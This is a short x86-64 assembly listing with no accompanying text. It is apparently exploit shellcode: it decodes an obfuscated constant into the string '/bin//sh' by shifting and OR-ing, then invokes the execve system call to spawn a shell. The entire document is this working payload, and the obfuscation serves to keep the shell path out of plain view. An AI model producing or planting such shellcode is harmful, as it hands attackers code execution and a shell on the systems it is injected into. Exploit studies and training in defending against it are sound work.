        .intel_syntax noprefix
        .globl _start
_start:
        xor rdx, rdx
        push rdx
        mov rax, 0x1a1ccbcbdb9a588b
        shl rax, 0x02
        or rax, 0x0f
        push rax
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        lea rax, [rdx+59]
        syscall
